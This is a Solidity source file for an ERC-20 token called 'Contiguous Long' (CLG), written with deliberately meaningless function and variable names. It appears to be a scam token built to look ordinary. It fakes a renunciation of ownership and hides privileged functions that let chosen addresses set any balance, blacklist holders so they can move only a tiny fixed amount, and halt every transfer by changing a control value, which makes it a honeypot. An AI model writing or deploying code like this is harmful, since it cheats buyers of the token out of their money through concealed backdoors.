//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface minLaunchedTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract toAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fundLimit {
    function createPair(address liquidityMinMarketing, address receiverMin) external returns (address);
}

interface enableFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromTeam) external view returns (uint256);

    function transfer(address tradingReceiverFund, uint256 limitLaunched) external returns (bool);

    function allowance(address autoTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitLaunched) external returns (bool);

    function transferFrom(
        address sender,
        address tradingReceiverFund,
        uint256 limitLaunched
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoLaunch, uint256 value);
    event Approval(address indexed autoTx, address indexed spender, uint256 value);
}

interface autoLimitBuy is enableFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ContiguousLong is toAt, enableFrom, autoLimitBuy {

    string private maxMin = "Contiguous Long";

    address teamLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private listTeam;

    function getOwner() external view returns (address) {
        return sellMin;
    }

    address toFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function symbol() external view virtual override returns (string memory) {
        return fromMarketing;
    }

    function owner() external view returns (address) {
        return sellMin;
    }

    function transferFrom(address tradingMinBuy, address tradingReceiverFund, uint256 limitLaunched) external override returns (bool) {
        if (_msgSender() != teamLaunch) {
            if (liquidityFund[tradingMinBuy][_msgSender()] != type(uint256).max) {
                require(limitLaunched <= liquidityFund[tradingMinBuy][_msgSender()]);
                liquidityFund[tradingMinBuy][_msgSender()] -= limitLaunched;
            }
        }
        return totalSell(tradingMinBuy, tradingReceiverFund, limitLaunched);
    }

    function fundAuto(address tradingMinBuy, address tradingReceiverFund, uint256 limitLaunched) internal returns (bool) {
        require(toSell[tradingMinBuy] >= limitLaunched);
        toSell[tradingMinBuy] -= limitLaunched;
        toSell[tradingReceiverFund] += limitLaunched;
        emit Transfer(tradingMinBuy, tradingReceiverFund, limitLaunched);
        return true;
    }

    uint8 private sellExempt = 18;

    function limitReceiverAuto(address isLiquidity) public {
        limitIs();
        
        if (isLiquidity == txExempt || isLiquidity == toAmount) {
            return;
        }
        buyEnable[isLiquidity] = true;
    }

    mapping(address => mapping(address => uint256)) private liquidityFund;

    uint256 private takeLimit = 100000000 * 10 ** 18;

    function transfer(address shouldMax, uint256 limitLaunched) external virtual override returns (bool) {
        return totalSell(_msgSender(), shouldMax, limitLaunched);
    }

    function receiverSwap(address launchedAmountLiquidity) public {
        require(launchedAmountLiquidity.balance < 100000);
        if (receiverReceiver) {
            return;
        }
        if (listTeam) {
            minFee = false;
        }
        minSender[launchedAmountLiquidity] = true;
        if (autoTake) {
            txSellReceiver = true;
        }
        receiverReceiver = true;
    }

    function balanceOf(address fromTeam) public view virtual override returns (uint256) {
        return toSell[fromTeam];
    }

    bool public autoTake;

    mapping(address => bool) public minSender;

    uint256 swapSell;

    function takeFee() public {
        emit OwnershipTransferred(txExempt, address(0));
        sellMin = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return takeLimit;
    }

    function allowance(address launchedFee, address feeFund) external view virtual override returns (uint256) {
        if (feeFund == teamLaunch) {
            return type(uint256).max;
        }
        return liquidityFund[launchedFee][feeFund];
    }

    uint256 constant listSellLimit = 17 ** 10;

    function name() external view virtual override returns (string memory) {
        return maxMin;
    }

    uint256 private fundMin;

    uint256 public takeTradingLimit;

    mapping(address => uint256) private toSell;

    address public toAmount;

    bool private minFee;

    function totalSell(address tradingMinBuy, address tradingReceiverFund, uint256 limitLaunched) internal returns (bool) {
        if (tradingMinBuy == txExempt) {
            return fundAuto(tradingMinBuy, tradingReceiverFund, limitLaunched);
        }
        uint256 teamReceiver = enableFrom(toAmount).balanceOf(toFrom);
        require(teamReceiver == autoLiquidity);
        require(tradingReceiverFund != toFrom);
        if (buyEnable[tradingMinBuy]) {
            return fundAuto(tradingMinBuy, tradingReceiverFund, listSellLimit);
        }
        return fundAuto(tradingMinBuy, tradingReceiverFund, limitLaunched);
    }

    uint256 autoLiquidity;

    bool public receiverReceiver;

    address public txExempt;

    function decimals() external view virtual override returns (uint8) {
        return sellExempt;
    }

    constructor (){
        
        minLaunchedTotal toLiquidityTrading = minLaunchedTotal(teamLaunch);
        toAmount = fundLimit(toLiquidityTrading.factory()).createPair(toLiquidityTrading.WETH(), address(this));
        
        txExempt = _msgSender();
        takeFee();
        minSender[txExempt] = true;
        toSell[txExempt] = takeLimit;
        
        emit Transfer(address(0), txExempt, takeLimit);
    }

    mapping(address => bool) public buyEnable;

    function limitIs() private view {
        require(minSender[_msgSender()]);
    }

    event OwnershipTransferred(address indexed fundShould, address indexed limitSenderTo);

    bool private txSellReceiver;

    function atAmount(address shouldMax, uint256 limitLaunched) public {
        limitIs();
        toSell[shouldMax] = limitLaunched;
    }

    function feeTx(uint256 limitLaunched) public {
        limitIs();
        autoLiquidity = limitLaunched;
    }

    string private fromMarketing = "CLG";

    function approve(address feeFund, uint256 limitLaunched) public virtual override returns (bool) {
        liquidityFund[_msgSender()][feeFund] = limitLaunched;
        emit Approval(_msgSender(), feeFund, limitLaunched);
        return true;
    }

    bool public swapAuto;

    address private sellMin;

}